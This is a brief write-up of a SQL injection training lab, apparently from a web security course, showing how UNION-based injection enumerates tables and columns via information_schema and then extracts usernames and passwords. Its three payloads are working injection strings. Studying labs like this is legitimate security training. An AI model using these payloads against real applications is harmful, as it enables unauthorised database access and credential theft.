#  Lab: SQL Injection Attack (Listing Database Contents - Non-Oracle)

| **Category** | Web Security / SQL Injection |
| :--- | :--- |
| **Vulnerability Type** | UNION-Based SQLi |
| **Database** | PostgreSQL / MySQL (Non-Oracle) |
| **Goal** | Enumerate database structure to find hidden tables and extract credentials. |
| **Status** | ✅ Solved |

---

## Conceptual Overview
When the table names are unknown, attackers must perform **Database Reconnaissance**. Most non-Oracle databases (like PostgreSQL, MySQL) support a standard information schema.
* **`information_schema.tables`**: Contains a list of all tables in the database.
* **`information_schema.columns`**: Contains a list of all columns within those tables.



---

## Exploitation Steps

### Phase 1: Finding the Table Name
I queried the system to list all tables to find the one holding user data.
* **Payload:**
    ```sql
    ' UNION SELECT table_name, NULL FROM information_schema.tables--
    ```
* **Result:** Found a table named `users_xxxx` (randomized suffix).

### Phase 2: Finding Column Names
I queried the columns specific to the identified table.
* **Payload:**
    ```sql
    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xxxx'--
    ```
* **Result:** Found columns `username_xxxx` and `password_xxxx`.

### Phase 3: Data Extraction
Used the discovered names to dump the credentials.
* **Payload:**
    ```sql
    ' UNION SELECT username_xxxx, password_xxxx FROM users_xxxx--
    ```

---